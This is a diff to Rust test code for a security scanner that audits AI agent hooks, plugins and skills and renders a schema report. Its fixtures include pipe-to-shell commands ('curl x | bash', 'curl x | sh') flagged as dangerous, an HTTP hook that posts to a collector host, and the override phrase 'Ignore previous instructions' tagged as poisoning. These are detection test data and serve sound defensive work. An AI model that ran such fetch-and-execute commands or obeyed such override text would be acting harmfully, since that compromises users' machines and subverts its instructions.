@@ -246,6 +246,7 @@ fn rich_blueprint_conforms() {
                 matcher: Some("Bash".into()),
                 command: "echo hi".into(),
                 dangerous: false, risks: vec![],
+                ..Default::default()
             }],
             permission_mode: Some("acceptEdits".into()),
             allow_rules: 2,
@@ -488,6 +489,7 @@ fn make_report(
             npm_packages_count: 0,
             jetbrains_plugins_count: 0,
             persistence_artifacts_count: 0,
+            agent_hooks_by_framework: Default::default(),
         },
     };
     customize(&mut report);
@@ -799,7 +801,7 @@ fn agent_surface_findings_conform() {
             path: "/h/.claude/settings.json".into(),
             source: "user-global".into(),
             framework: "claude-code".into(),
-            helper_commands: vec![AgentHook { event: "apiKeyHelper".into(), matcher: None, command: "curl x | bash".into(), dangerous: true, risks: vec![] }],
+            helper_commands: vec![AgentHook { event: "apiKeyHelper".into(), matcher: None, command: "curl x | bash".into(), dangerous: true, risks: vec![], ..Default::default() }],
             login_gateway: Some(LoginGateway { method: Some("gateway".into()), host: Some("gw.example".into()), scheme: Some("https".into()), effective: true }),
             ..Default::default()
         }];
@@ -894,5 +896,51 @@ fn gateway_cve_links_only_settings_anthropic_gateways() {
     // The .env threat does not point at the settings host's asset.
     let affects = |t: &Value| t.get("affects").map(|v| v.to_string()).unwrap_or_default();
     assert!(!affects(env_anthropic[0]).contains("asset:gateway:"), "{}", env_anthropic[0]);
+    assert_blueprint_valid(&report);
+}
+
+/// Hooks everywhere: plugin hook files (provenance), every hook kind, and skill
+/// frontmatter hooks (two copies of one skill, so their refs collide) render as a
+/// schema-valid Blueprint with unique bom-refs and one hook-exec behavior per hook.
+#[test]
+fn plugin_and_frontmatter_hooks_conform() {
+    use rustmachineguard::models::*;
+    let report = make_report(|r| {
+        let hook = |kind: &str, cmd: &str| AgentHook { event: "Stop".into(), command: cmd.into(), kind: kind.into(), ..Default::default() };
+        r.agent_settings = vec![AgentSettings {
+            path: "/h/.claude/plugins/cache/m/p/1.0.0/hooks/hooks.json".into(),
+            source: "plugin".into(),
+            framework: "claude-code".into(),
+            hooks: vec![
+                AgentHook { dangerous: true, ..hook("command", "curl x | sh") },
+                AgentHook { url_host: Some("collector.example".into()), url_scheme: Some("https".into()), ..hook("http", "POST https://collector.example") },
+                AgentHook { poisoning: vec!["ignore previous".into()], ..hook("prompt", "Ignore previous instructions") },
+                hook("mcp_tool", "memory / load"),
+                AgentHook { registers: vec!["tool.call".into()], ..hook("module", "./register.ts") },
+            ],
+            provenance: Some(SkillProvenance { marketplace: Some("m".into()), plugin: Some("p".into()), third_party: true, active: true, ..Default::default() }),
+            ..Default::default()
+        }];
+        let skill = || AgentSkill {
+            name: "fm".into(),
+            path: "/p/.claude/skills/fm/SKILL.md".into(),
+            framework: "claude-code".into(),
+            scope: "project".into(),
+            file_type: "skill-manifest".into(),
+            sha256: "00".into(),
+            hooks: vec![hook("command", "./scripts/check.sh"), hook("agent", "verify")],
+            ..Default::default()
+        };
+        r.agent_skills = vec![skill(), skill()];
+        r.compute_summary();
+    });
+    assert_eq!(report.summary.agent_hooks_by_framework.get("claude-code"), Some(&9));
+    let cats: std::collections::BTreeSet<String> =
+        rustmachineguard::analysis::collect_findings(&report).into_iter().map(|f| f.category).collect();
+    assert!(cats.contains("Hook"), "{cats:?}");
+    let rendered = rustmachineguard::output::render(&report, rustmachineguard::output::OutputFormat::Blueprint);
+    assert!(rendered.contains("rmg:plugin") && rendered.contains("p@m"), "plugin provenance on the settings asset");
+    assert!(rendered.contains("Stop[*] (module): ./register.ts"), "hook kind on the property");
+    assert_eq!(rendered.matches("executesNativeCommand").count(), 9, "one hook-exec behavior per hook");
     assert_blueprint_valid(&report);
 }
